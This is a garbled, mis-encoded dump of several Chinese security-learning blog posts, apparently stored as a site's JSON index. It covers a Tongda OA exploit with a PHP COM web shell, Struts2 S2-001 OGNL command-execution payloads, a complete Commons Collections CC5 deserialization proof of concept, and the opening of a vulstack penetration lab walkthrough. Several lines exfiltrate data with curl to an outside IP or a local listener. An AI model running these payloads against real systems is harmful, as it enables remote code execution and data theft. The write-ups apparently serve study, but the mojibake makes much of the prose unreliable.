å…¥ä¸€ä¸ªjsonæ ¼å¼çš„urlå³å¯ï¼Œå­—ç¬¦ä¸²ä¸­éœ€è¦åŒ…å«general/æˆ–è€…ispiritæˆ–è€…module/ 1json&#x3D;&#123;&quot;url&quot;: &quot;..&#x2F;..&#x2F;general&#x2F;..&#x2F;..&#x2F;attach&#x2F;im&#x2F;2003&#x2F;914853445.jpg&quot;&#125; phpinfo() æ³¨æ„ç‚¹é€šè¾¾OAå¼€å¯äº† disable_funcation åŠŸèƒ½ å¾ˆå¤šå¸¸è§çš„å‘½ä»¤æ‰§è¡Œå‡½æ•°å¦‚ execã€evalã€systemç­‰éƒ½è¢«ç¦æ­¢äº†ã€‚è¿™ä¹Ÿæ˜¯æˆ‘ä¸€å¼€å§‹å¤±è´¥çš„åŸå› ã€‚ æŸ¥çœ‹é…ç½®æ–‡ä»¶ å¸¸ç”¨çš„å‘½ä»¤æ‰§è¡Œå‡½æ•°è¿˜æœ‰popen()æ²¡è¿‡æ»¤ 123$file &#x3D; popen(&quot;ipconfig&quot;,&quot;w&quot;);&#x2F;&#x2F;some code to be executedpclose($file); ä½†æ˜¯æ³¨æ„æ²¡æœ‰å›æ˜¾ï¼Œå¯åå¼¹shellæˆ–è€…curlå¸¦å‡º æˆ–è€…å‚è€ƒé“¾æ¥é‡Œé¢çš„æ–¹æ³•bypass disable_func window comç»„ä»¶(php 5.4) 12345678&lt;?php$command&#x3D;$_GET[&#39;a&#39;];$wsh &#x3D; new COM(&#39;WScript.shell&#39;); &#x2F;&#x2F; ç”Ÿæˆä¸€ä¸ªCOMå¯¹è±¡ Shell.Applicationä¹Ÿèƒ½$exec &#x3D; $wsh-&gt;exec(&quot;cmd &#x2F;c&quot;.$command); &#x2F;&#x2F;è°ƒç”¨å¯¹è±¡æ–¹æ³•æ¥æ‰§è¡Œå‘½ä»¤$stdout &#x3D; $exec-&gt;StdOut();$stroutput &#x3D; $stdout-&gt;ReadAll();echo $stroutput;?&gt; æ€»ç»“å¯¹äºè¿™ç§zendåŠ å¯†çš„ç›®å‰æ— æ³•è°ƒè¯•ï¼Œè¿˜åŸçš„å‡ºæ¥çš„æºç æ— æ³•æ­£å¸¸è¿è¡Œã€‚ è¿™ä¸ªæ¼æ´è¿˜æ˜¯å®¹æ˜“åˆ†æçš„ï¼Œä¹Ÿåæ˜ å‡ºå¾ˆå¤šç°ä»£cmsä»ç„¶å­˜åœ¨ç€å®‰å…¨é—®é¢˜ï¼Œä¹‹åå¤šåˆ†ææ–°çˆ†å‡ºçš„æ¼æ´ã€‚ å‚è€ƒé“¾æ¥ https://www.freebuf.com/column/230871.html https://www.cnblogs.com/-qing-/p/10944118.html","categories":[],"tags":[{"name":"phpä»£ç å®¡è®¡","slug":"phpä»£ç å®¡è®¡","permalink":"https://glotozz.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"Javaæ¼æ´å­¦ä¹ â€”S2-001","slug":"Javaæ¼æ´å­¦ä¹ â€”S2-00","date":"2020-03-21T03:55:49.000Z","updated":"2020-03-28T00:24:42.499Z","comments":true,"path":"2020/03/21/Javaæ¼æ´å­¦ä¹ â€”S2-00/","link":"","permalink":"https://glotozz.github.io/2020/03/21/Java%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E2%80%94S2-00/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• é¢„å¤‡çŸ¥è¯† ç¯å¢ƒæ­å»º æ¼æ´å¤ç° åŸç†åˆ†æ æ¼æ´ä¿®å¤ æ€»ç»“ å‚è€ƒé“¾æ¥ ä»Šå¤©çœ‹ä¸‹Struts2ç»å…¸æ¼æ´ï¼ŒæŒæ¡ä»£ç å±‚é¢çš„åŸç†ã€‚ é¢„å¤‡çŸ¥è¯† Servlet Filters(æ©™è‰²)ï¼šè¿‡æ»¤å™¨ï¼Œæ‰€æœ‰çš„è¯·æ±‚éƒ½è¦ç»è¿‡è¿‡æ»¤å™¨çš„å¤„ç†ã€‚ Struts Core(æµ…è“è‰²)ï¼šStruts2çš„æ ¸å¿ƒéƒ¨åˆ†ã€‚ Interceptors(æµ…ç»¿è‰²)ï¼šStruts2çš„æ‹¦æˆªå™¨ã€‚ User created(æµ…é»„è‰²)ï¼šéœ€è¦å¼€å‘äººå‘˜åˆ›å»ºçš„éƒ¨åˆ†ã€‚ å…·ä½“åŸç†å¯ä»¥å‚è€ƒé“¾æ¥æˆ–è€…strtuså®˜æ–¹æ–‡æ¡£ ç¯å¢ƒæ­å»ºå½±å“èŒƒå›´ï¼šWebWork 2.2.0-WebWork 2.2.5ï¼ŒStruts 2.0.0-Struts 2.0.8 mavenæ­å»º 123456789&lt;dependencies&gt; &lt;!-- struts2ä¾èµ–åŒ… --&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.struts&lt;&#x2F;groupId&gt; &lt;artifactId&gt;struts2-core&lt;&#x2F;artifactId&gt; &lt;version&gt;2.0.8&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;&#x2F;dependencies&gt; æ³¨æ„maven/conf/settings.xmlåŠ ä¸ªé•œåƒ 123456&lt;mirror&gt; &lt;id&gt;nexus-aliyun&lt;&#x2F;id&gt; &lt;mirrorOf&gt;central&lt;&#x2F;mirrorOf&gt; &lt;name&gt;Nexus aliyun&lt;&#x2F;name&gt; &lt;url&gt;http:&#x2F;&#x2F;maven.aliyun.com&#x2F;nexus&#x2F;content&#x2F;groups&#x2F;public&lt;&#x2F;url&gt; &lt;&#x2F;mirror&gt; å…ˆåˆ›å»ºä¸€ä¸ªJavaé¡¹ç›® ç„¶åAdd Framework Support å…ˆå¯¼å…¥mavenä¸‹è½½struts å†æ¬¡Add Framework Supportï¼Œè¿™æ—¶é€‰ä¸­strutsï¼ŒjaråŒ…å°±æ˜¯ä¹‹å‰mavenä¸‹å¥½çš„åŒ… æ·»åŠ Tomcatå¯åŠ¨å³å¯ï¼Œå¦‚æœå‡ºç°æŠ¥é”™ï¼ŒProject Settings-&gt;Artifactså†é…ç½®ä¸€ä¸‹ æˆåŠŸå¯åŠ¨ æºç ï¼š https://github.com/vulhub/vulhub æ¼æ´å¤ç°è·å–tomcatè·¯å¾„ 1%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125; å‘½ä»¤æ‰§è¡Œ 1%&#123;#a&#x3D;(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;whoami&quot;&#125;)).redirectErrorStream(true).start(),#b&#x3D;#a.getInputStream(),#c&#x3D;new java.io.InputStreamReader(#b),#d&#x3D;new java.io.BufferedReader(#c),#e&#x3D;new char[50000],#d.read(#e),#f&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125; åŸç†åˆ†æåœ¨LoginActionä¸Šæ‰“ä¸ªæ–­ç‚¹ 1invokeAction:404, DefaultActionInvocation (com.opensymphony.xwork2) åœ¨DefaultActionInvocationç±»ä¸­åå°„è°ƒç”¨äº†æˆ‘ä»¬çš„ç±» æ¼æ´æ˜¯å‡ºç°åœ¨Struts2é‡æ–°æ¸²æŸ“jspæ—¶ï¼Œå¯¹ognlè¡¨è¾¾å¼è¿›è¡Œäº†é€’å½’è§£æï¼Œå¯¼è‡´äº†æ¶æ„çš„è¡¨è¾¾å¼è¢«æ‰§è¡Œã€‚ ä¸»è¦æ˜¯åœ¨xwork-2.0.3-sources.jar!/com/opensymphony/xwork2/util/TextParseUtil.java æŸ¥åˆ°è¯¥æ–¹æ³•çš„ä½œç”¨æ˜¯å°†å˜é‡è½¬æ¢ä¸ºå¯¹è±¡ é¦–å…ˆçœ‹åˆ°æœ‰ä¸ªwhile(True)ï¼Œä¹‹åå°±æ˜¯å…ˆè½¬åŒ–ä¸º%{xxx}çš„æ ¼å¼ï¼Œåˆ©ç”¨onglè§£æï¼Œ 1Object o &#x3D; stack.findValue(var, asType); æ¯”å¦‚%{username}è§£æä¸ºæˆ‘ä»¬ä¼ å…¥çš„å€¼%{1+1}ï¼Œè€Œ%{1+1}è§£æä¸º2ï¼Œ2ä¸æ»¡è¶³è§„åˆ™ï¼Œ è·³å‡ºå¾ªç¯ æ¼æ´ä¿®å¤åœ¨xwork2.0.4ä¸­ï¼Œ æ·»åŠ äº†ä¸€ä¸ªmaxLoopCountå±æ€§ï¼Œé™åˆ¶äº†é€’å½’è§£æçš„æœ€å¤§æ•°ç›®ã€‚ æ€»ç»“æ­ç¯å¢ƒ2hï¼Œè°ƒè¯•20minï¼Œåˆ†æ5minã€‚ã€‚ã€‚ è¿˜æ²¡æœ‰å¯¹onglçš„è§£æä»£ç è¿›è¡Œåˆ†æï¼Œæœ‰ç©ºå†çœ‹ å‚è€ƒé“¾æ¥ https://mengsec.com/2019/10/29/Java-Web-S2-001/ https://struts.apache.org/core-developers/big-picture https://www.dazhuanlan.com/2020/01/19/5e23f4801e064/ https://struts.apache.org/maven/struts2-core/apidocs/index.html","categories":[],"tags":[{"name":"java","slug":"java","permalink":"https://glotozz.github.io/tags/java/"}]},{"title":"Javaååºåˆ—åŒ–æ¼æ´-Apache Commons Collections5","slug":"Javaååºåˆ—åŒ–æ¼æ´-Apache Commons Collections5","date":"2020-03-20T03:00:55.000Z","updated":"2020-04-20T15:23:53.484Z","comments":true,"path":"2020/03/20/Javaååºåˆ—åŒ–æ¼æ´-Apache Commons Collections5/","link":"","permalink":"https://glotozz.github.io/2020/03/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-Apache%20Commons%20Collections5/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• é¢„å¤‡çŸ¥è¯† ç¯å¢ƒæ­å»º æ¼æ´åˆ†æ æ€»ç»“ å‚è€ƒé“¾æ¥ é¢„å¤‡çŸ¥è¯†Javaä¸­çš„ååºåˆ—åŒ–readObject åŸç†ä¸å†èµ˜è¿°ã€‚ åœ¨é‡å†™readObject()æ–¹æ³•æ—¶ä¼šå†™ä¸€äº›æ­£å¸¸çš„æ“ä½œï¼Œç»“åˆJavaçš„åå°„æœºåˆ¶ä¾¿å¯ä»¥æ„é€ åˆ©ç”¨é“¾ã€‚ Javaçš„åå°„æœºåˆ¶ ä¸‹é¢æ‘˜è‡ªpç‰›çš„å°å¯†åœˆ åå°„æ˜¯å¤§å¤šæ•°è¯­è¨€ï§©éƒ½å¿…ï¥§å¯å°‘çš„ç»„æˆéƒ¨åˆ†ï¼Œå¯¹è±¡å¯ä»¥é€šè¿‡åå°„è·å–ä»–çš„ç±»ï¼Œç±»å¯ä»¥é€šè¿‡åå°„æ‹¿åˆ°æ‰€æœ‰æ–¹æ³•ï¼ˆåŒ…æ‹¬ç§æœ‰ï¼‰ï¼Œæ‹¿åˆ°çš„æ–¹æ³•å¯ä»¥è°ƒç”¨ï¼Œæ€»ä¹‹é€šè¿‡â€œåå°„â€ï¼Œæˆ‘ä»¬å¯ä»¥å°†Javaè¿™ç§é™æ€è¯­è¨€é™„åŠ ä¸ŠåŠ¨æ€ç‰¹æ€§ã€‚ 1234public void execute(String className, String methodName) throws Exception &#123; Class clazz = Class.forName(className); clazz.getMethod(methodName).invoke(clazz.newInstance());&#125; è·å–ç±»çš„æ–¹æ³•ï¼š forNameå®ä¾‹ï¦µåŒ–ç±»å¯¹è±¡çš„æ–¹æ³•ï¼š newInstanceè·å–å‡½æ•°çš„æ–¹æ³•ï¼š getMethodæ‰§ï¨ˆå‡½æ•°çš„æ–¹æ³•ï¼š invoke ä¸Šé¢çš„executeæ–¹æ³•å°±å¯ä»¥æ‰§è¡ŒclassNmaeç±»çš„methodNameæ–¹æ³• ç¯å¢ƒæ­å»ºå¼•å…¥commons-collections mavenæ­å»º 12345&lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.1&lt;/version&gt;&lt;/dependency&gt; ç‰ˆæœ¬&lt;=3.2.1å­˜åœ¨æ¼æ´ã€‚ æ¼æ´åˆ†æApache Commons Collectionsä¸­æœ‰ä¸€ä¸ªç‰¹æ®Šçš„æ¥å£ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªå®ç°è¯¥æ¥å£çš„ç±»å¯ä»¥é€šè¿‡è°ƒç”¨Javaçš„åå°„æœºåˆ¶æ¥è°ƒç”¨ä»»æ„å‡½æ•°ï¼Œå«åšInvokerTransformerã€‚ \\org\\apache\\commons\\collections\\functors\\InvokerTransformer.class å’Œæˆ‘ä¸Šé¢çš„ä¾‹å­å¾ˆåƒï¼Œä¼ å…¥çš„å‚æ•°æ˜¯inputæ˜¯ä¸€ä¸ªå®ä¾‹åŒ–å¯¹è±¡ï¼Œè°ƒç”¨çš„æ–¹æ³•iMethodNameå’Œå‚æ•°iArgséƒ½æ˜¯InvokerTransformerå®ä¾‹åŒ–æ—¶è®¾å®šçš„ã€‚æ‰€ä»¥åˆ©ç”¨è¿™ä¸ªæ–¹æ³•ä¾¿å¯ä»¥è°ƒç”¨ä»»æ„å¯¹è±¡çš„ä»»æ„æ–¹æ³•ã€‚ æƒ³åˆ°å¸¸ç”¨çš„å‘½ä»¤æ‰§è¡Œæ„é€ Runtime.getRuntime().exec(cmd) 123456Transformer invokerTransformer = new InvokerTransformer(\"exec\", new Class[] &#123;String.class &#125;, new Object[] &#123;\"curl localhost:7999\"&#125;);invokerTransformer.transform(Runtime.getRuntime()); æˆåŠŸæ‰§è¡Œ ä½†æ˜¯æœ‰æ—¶å€™æˆ‘ä»¬éœ€è¦é€’å½’è°ƒç”¨å¯¹è±¡ä¹Ÿæ˜¯æ”¯æŒçš„ï¼Œcommons-collectionsçš„ChainedTransformerç±»ä¸­å°è£…å¥½äº†äº†é€’å½’è°ƒç”¨è¿™ä¸ªæ–¹æ³• æµ‹è¯•ä»£ç  12345678Transformer[] transformers = new Transformer[] &#123; new InvokerTransformer(\"exec\", new Class[] &#123;String.class &#125;, new Object[] &#123;\"curl localhost:7999\"&#125;) &#125;;Transformer transformerChain = new ChainedTransformer(transformers);transformerChain.transform(Runtime.getRuntime()); newä¸€ä¸ªInvokerTransformerå¯¹è±¡ï¼Œä¼ å…¥è¦æ‰§è¡Œæ–¹æ³•å’Œå‚æ•°ï¼Œæ”¾å…¥æ•°ç»„å³å¯ æ¥ä¸‹æ¥å°±æ˜¯å¯»æ‰¾ååºåˆ—åŒ–çš„è§¦å‘ç‚¹ã€‚ è¿™é‡Œé¦–å…ˆç”¨åˆ°äº†ConstantTransformerï¼Œå†…ç½®çš„ä¸€ä¸ªç±»ï¼Œä¼šå°†å‚æ•°åŸæ ·è¿”å›ã€‚ å› æ­¤æ„é€  12345678Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(\"exec\", new Class[] &#123;String.class &#125;, new Object[] &#123;\"curl localhost:7999\"&#125;)&#125;;Transformer transformerChain = new ChainedTransformer(transformers); ä½†æ˜¯åºåˆ—åŒ–çš„æ—¶å€™æŠ¥é”™Exception in thread &quot;main&quot; java.io.NotSerializableException: java.lang.Runtime å› ä¸ºRuntimeå®ä¾‹åŒ–å¯¹è±¡æ˜¯ä¸å…è®¸åºåˆ—åŒ–çš„ï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥ä¼ å…¥å®ä¾‹åŒ–çš„å¯¹è±¡ï¼ŒRuntimeæ˜¯åˆ©ç”¨getRuntimeé™æ€æ–¹æ³•å®ä¾‹åŒ–çš„ï¼Œæ‰€ä»¥å°±æ˜¯è·å–åˆ°è¿™ä¸ªæ–¹æ³•ã€‚ å¯ä»¥å‚è€ƒpç‰›ä¹‹å‰è§£å†³Runtimeä¸èƒ½newInstance()çš„ä»£ç ï¼Œè™½ç„¶å½“æ—¶è§£å†³çš„æ˜¯Runtimeç±»æ˜¯å•ä¾‹æ¨¡å¼è¿™ä¸ªç‰¹æ€§ 12345Class clazz = Class.forName(\"java.lang.Runtime\");Method getRuntimeMethod = clazz.getMethod(\"getRuntime\");Object runtime = getRuntimeMethod.invoke(clazz);Method execMethod = clazz.getMethod(\"exec\", String.class);execMethod.invoke(runtime, \"calc.exe\"); ç¬¬ä¸€æ¬¡çš„objectç”±æˆ‘ä»¬ä¼ å…¥ï¼Œä¹‹åçš„è°ƒç”¨å½¢å¼ä¸ºmethod.invoke(object,args) é‚£ä¹ˆé¦–å…ˆä¼ å…¥ä¸€ä¸ªRuntime.classï¼Œåå°„è°ƒç”¨getRuntimeï¼Œè¿”å›getRuntimeMethodï¼Œ åå°„è°ƒç”¨invokeï¼Œè¿”å›Runtimeå®ä¾‹å¯¹è±¡ï¼Œåå°„è°ƒç”¨execå‘½ä»¤æ‰§è¡Œ å‚è€ƒé“¾æ¥ä»£ç  1234567891011121314151617Transformer[] transformers = new Transformer[] &#123; //ä¼ å…¥Runtimeç±» new ConstantTransformer(Runtime.class), //åå°„è°ƒç”¨getMethodæ–¹æ³•ï¼Œç„¶ågetMethodæ–¹æ³•å†åå°„è°ƒç”¨getRuntimeæ–¹æ³•ï¼Œè¿”å›Runtime.getRuntime()æ–¹æ³• new InvokerTransformer(\"getMethod\", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;\"getRuntime\", new Class[0] &#125;), //åå°„è°ƒç”¨invokeæ–¹æ³•ï¼Œç„¶ååå°„æ‰§è¡ŒRuntime.getRuntime()æ–¹æ³•ï¼Œè¿”å›Runtimeå®ä¾‹åŒ–å¯¹è±¡ new InvokerTransformer(\"invoke\", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;), //åå°„è°ƒç”¨execæ–¹æ³• new InvokerTransformer(\"exec\", new Class[] &#123;String.class &#125;, new Object[] &#123;\"curl localhost:7999\"&#125;) &#125;;Transformer transformerChain = new ChainedTransformer(transformers); ä½†æ˜¯è¿˜æ˜¯éœ€è¦è°ƒç”¨ä¸€ä¸‹transform()æ–¹æ³•æ‰èƒ½è§¦å‘ã€‚ æ‰¾åˆ°LazyMapç±»çš„getæ–¹æ³•ï¼Œå‘ç°é‡Œé¢è°ƒç”¨äº†factoryå®ä¾‹åŒ–çš„transformæ–¹æ³•ã€‚ å…¨å±€æœç´¢get()æ–¹æ³•ï¼Œæ‰¾åˆ°TiedMapEntryç±»çš„toString()å’ŒgetValue()æ–¹æ³• Javaä¸­çš„toStringæ–¹æ³•æ˜¯å’ŒPHPä¸­çš„__toStringé­”æœ¯æ–¹æ³•æœ‰ç›¸åŒçš„ä½œç”¨çš„ï¼Œå½“å°†è¿™ä¸ªå¯¹è±¡å½“åšå­—ç¬¦ä¸²å¤„ç†çš„æ—¶å€™ä¼šè‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ã€‚ toString()è°ƒç”¨äº†getValue()ï¼Œ getValueæ–¹æ³•è°ƒç”¨äº†mapå®ä¾‹çš„getæ–¹æ³• é‚£ä¹ˆå°±å¯ä»¥æ„é€ äº† 12345Transformer transformerChain = new ChainedTransformer(transformers);Map innerMap = new HashMap();Map lazyMap = LazyMap.decorate(innerMap, transformerChain);TiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\"); è¿™æ ·ååºåˆ—åŒ–entryå¯¹è±¡åï¼Œè¿˜æ˜¯éœ€è¦System.out.printlnæ¥è§¦å‘toSring() æ‰€ä»¥æ¥ä¸‹æ¥æˆ‘ä»¬æ‰¾è¿™æ ·ä¸€ä¸ªç±»ï¼šé‡å†™äº†readObjectæ–¹æ³•ï¼Œå¹¶ä¸”å¯¹æŸä¸ªå˜é‡è¿›è¡Œäº†å­—ç¬¦ä¸²æ“ä½œ çœ‹ysoserialçš„POC(cc5)ç›´æ¥åˆ©ç”¨äº†BadAttributeValueExpExceptionç±»ï¼Œè¿™ä¸ªç±»ç›´æ¥å°±è°ƒç”¨äº†toStringæ–¹æ³•ã€‚ BadAttributeValueExpExceptionç±» æ‰€ä»¥å°†BadAttributeValueExpExceptionç±»å®ä¾‹åŒ–ï¼Œvalå˜é‡èµ‹å€¼ä¸ºTiedMapEntryçš„å®ä¾‹åŒ–å¯¹è±¡ï¼Œååºåˆ—åŒ–çš„æ—¶å€™ä¾¿ä¼šè§¦å‘å‘½ä»¤æ‰§è¡Œã€‚ æœ‰ä¸€ç‚¹å°±æ˜¯valæ˜¯ç§æœ‰å±æ€§ï¼Œæ²¡æœ‰æä¾›set()ï¼Œéœ€è¦ä½¿ç”¨åå°„æ¥èµ‹å€¼ 1234567891011121314151617package com.company;import java.lang.reflect.Field;public class Test &#123; private String readOnly; public String getReadOnly() &#123; return readOnly; &#125; public static void main(String[] args) throws SecurityException, NoSuchFieldException, IllegalArgumentException, IllegalAccessException &#123; Test t = new Test(); Field f = t.getClass().getDeclaredField(\"readOnly\"); f.setAccessible(true); f.set(t, \"test\"); System.out.println(t.getReadOnly()); &#125;&#125; æœ€ç»ˆPOC 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061package com.company;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.Field;import java.lang.reflect.InvocationTargetException;import java.util.HashMap;import java.util.Map;public class Main &#123; public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InstantiationException, InvocationTargetException, IOException, NoSuchFieldException &#123; Transformer[] transformers = new Transformer[] &#123; //ä¼ å…¥Runtimeç±» new ConstantTransformer(Runtime.class), //åå°„è°ƒç”¨getMethodæ–¹æ³•ï¼Œç„¶ågetMethodæ–¹æ³•å†åå°„è°ƒç”¨getRuntimeæ–¹æ³•ï¼Œè¿”å›Runtime.getRuntime()æ–¹æ³• new InvokerTransformer(\"getMethod\", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;\"getRuntime\", new Class[0] &#125;), //åå°„è°ƒç”¨invokeæ–¹æ³•ï¼Œç„¶ååå°„æ‰§è¡ŒRuntime.getRuntime()æ–¹æ³•ï¼Œè¿”å›Runtimeå®ä¾‹åŒ–å¯¹è±¡ new InvokerTransformer(\"invoke\", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;), //åå°„è°ƒç”¨execæ–¹æ³• new InvokerTransformer(\"exec\", new Class[] &#123;String.class &#125;, new Object[] &#123;\"curl localhost:7999\"&#125;) &#125;; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap, transformerChain); TiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\"); BadAttributeValueExpException poc = new BadAttributeValueExpException(null); // valæ˜¯ç§æœ‰å˜é‡ï¼Œæ‰€ä»¥åˆ©ç”¨ä¸‹é¢æ–¹æ³•è¿›è¡Œèµ‹å€¼ Field valfield = poc.getClass().getDeclaredField(\"val\"); valfield.setAccessible(true); valfield.set(poc, entry); File f = new File(\"poc.txt\"); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f)); out.writeObject(poc); out.close(); //ä»æ–‡ä»¶ä¸­ååºåˆ—åŒ–objå¯¹è±¡ FileInputStream fis = new FileInputStream(\"poc.txt\"); ObjectInputStream ois = new ObjectInputStream(fis); //æ¢å¤å¯¹è±¡ ois.readObject(); ois.close(); &#125;&#125; é€šè¿‡ä¼ å…¥å­—ç¬¦ä¸²æ•°ç»„çš„æ–¹æ³•å¸¦å‡ºæ›´å¤šæ•°æ®ï¼Œä¹Ÿå¯ä»¥åå¼¹shell 1String[] cmd = &#123;\"/bin/sh\",\"-c\",\"curl http://174.0.223.65:2333/`/readflag`\"&#125;; 12345678910111213String[] execArgs = new String[] &#123; \"sh\", \"-c\", \"ifconfig &gt; /tmp/data &amp;&amp; curl localhost:7999/ -F 'file=@/tmp/data'\" &#125;;Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;\"getRuntime\", new Class[0] &#125;), new InvokerTransformer(\"invoke\", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;), new InvokerTransformer(\"exec\", new Class[] &#123;String[].class &#125;, new Object[] &#123; execArgs &#125;)&#125;; æ€»ç»“æ•´æ¡é“¾ä¸é•¿ï¼Œåˆ†æä¸‹æ¥è¿˜æ˜¯æŒºæœ‰æ„æ€çš„ï¼Œè¿™ä¸ªæ¼æ´è¿˜æœ‰ä¸€äº›å…¶ä»–çš„åˆ©ç”¨æ–¹å¼ï¼Œæœ‰ç©ºç»§ç»­çœ‹ã€‚ è‡ªå·±å¯¹javaçš„ä¸€äº›è¯­è¨€ç‰¹æ€§è¿˜æ˜¯ä¸å¤Ÿäº†è§£ã€‚ é“¾æ¥é‡Œçš„å¸ˆå‚…å†™çš„å¾ˆè¯¦ç»†ï¼Œè†œ å‚è€ƒé“¾æ¥ https://p0sec.net/index.php/archives/121/ https://zsxq.tricking.io/","categories":[],"tags":[{"name":"java","slug":"java","permalink":"https://glotozz.github.io/tags/java/"}]},{"title":"äºŒå“vulstack-1","slug":"äºŒå“vulstack-1","date":"2020-03-18T10:25:46.000Z","updated":"2020-03-25T08:06:31.098Z","comments":true,"path":"2020/03/18/äºŒå“vulstack-1/","link":"","permalink":"https://glotozz.github.io/2020/03/18/%E4%BA%8C%E5%93%81vulstack-1/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• ä¸€ã€ç¯å¢ƒæ­å»º äºŒã€ä¿¡æ¯æ”¶é›† ä¸‰ã€getshell å››ã€åŸŸæ¸—é€ msfææƒæ–¹æ³• å¼€å¯è¿œç¨‹æ¡Œé¢è¿æ¥ csä¸msfè”åŠ¨ è·å–å¯†ç æˆ–hash ä¿¡æ¯æ”¶é›† å†…ç½‘æ”¶é›† å†…ç½‘æ”»å‡»å§¿åŠ¿-MS08-067 mimikatzæ’ä»¶ å†…ç½‘æ”»å‡»å§¿åŠ¿-SMBè¿œç¨‹æ¡Œé¢å£ä»¤çŒœæµ‹ å†…ç½‘æ”»å‡»å§¿åŠ¿-Oracleæ•°æ®åº“ TNSæœåŠ¡æ¼æ´ å†…ç½‘æ”»å‡»å§¿åŠ¿-RPC DCOMæœåŠ¡æ¼æ´ å†…ç½‘æ”»å‡»å§¿åŠ¿- MS17-010 é’“é±¼æ”»å‡» å†…ç½‘å…¶ä»–ä¸»æœºç«¯å£-redis Getshell PTH åŸŸæ¸—é€-æ¨ªå‘ç§»åŠ¨[wmiåˆ©ç”¨] å†…ç½‘å…¶å®ƒä¸»æœºç«¯å£-ä»£ç†è½¬å‘ Frpå†…ç½‘ç©¿é€ CSä¸Šçº¿å†…ç½‘ä¸»æœº SSHéš§é“ æŒä¹…æ§åˆ¶ HTTP Listeneräº¤äº’ä¿¡æ¯éšè— SSP é‡‘ç¥¨åˆ©ç”¨ åé—¨æ¤å…¥ ç—•è¿¹æ¸…ç† æ€»ç»“ å‚è€ƒé“¾æ¥ æ˜¨å¤©çœ‹åˆ°çº¢æ—¥å®‰å…¨å‘äº†vulstack-1çš„wpï¼Œå†™çš„å¾ˆè¯¦ç»†ï¼Œå¾ˆå¤šæ€è·¯åœ¨æˆ‘ç¬¬ä¸€æ¬¡åšçš„æ—¶å€™éƒ½æ²¡æœ‰ç”¨åˆ°ï¼Œäºæ˜¯æ‰“ç®—è·Ÿç€wpå†å­¦ä¹ ä¸€ä¸‹ã€‚ ä¸€ã€ç¯å¢ƒæ­å»ºwin7-ä»…ä¸»æœº+NAT win2003-ä»…ä¸»æœº win2008-ä»…ä¸»æœº ç½‘ç»œæ‹“æ‰‘å›¾ è¾¹ç•Œæœºwin7ï¼š192.168.52.143ï¼Œ169.254.129.186 åŸŸæˆå‘˜win2003ï¼š192.168.52.141 åŸŸæ§win2008ï¼š192.168.52.138 æµ‹è¯•è¿é€šæ€§ win7å¯ä»¥pingé€šå¦ä¸¤å°ï¼Œä½†æ˜¯å¦å¤–ä¸¤å°pingä¸é€šwin7ï¼Œ å¯èƒ½ç”±äºWin7å¼€å¯äº†é˜²ç«å¢™ä¸”è¿‡æ»¤äº†ICMPæ•°æ®åŒ…ï¼Œæ‰€ä»¥åœ¨åç»­ä¿¡æ¯æ”¶é›†é˜¶æ®µçš„æ´»è·ƒä¸»æœºæ¢æµ‹æ—¶ä¸èƒ½ä½¿ç”¨-sP. äºŒã€ä¿¡æ¯æ”¶é›†æ¢æµ‹ä¸»æœº 1nmap -sn 192.168.56.0&#x2F;24 å¾—åˆ°ç›®æ ‡ipä¸º192.168.56.129 ç«¯å£æ‰«æ 1nmap -sS -sV -T5 -A -p- 192.168.1.129 ç›®å½•æ‰«æ 1gobuster dir -u http:&#x2F;&#x2F;192.168.1.129 -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;SecLists&#x2F;Discovery&#x2F;Web-Content&#x2F;raft-large-directories.txt -x .php,.txt,.html é‚£ä¸ªbeifen.raræ²¡æ‰«å‡ºæ¥ï¼Œå­—å…¸ä¸å¤Ÿå¼ºå¤§ï¼Œç•¥è¿‡ ä¸‰ã€getshellå­˜åœ¨phpmyadminä»¥åŠphpinfo.php 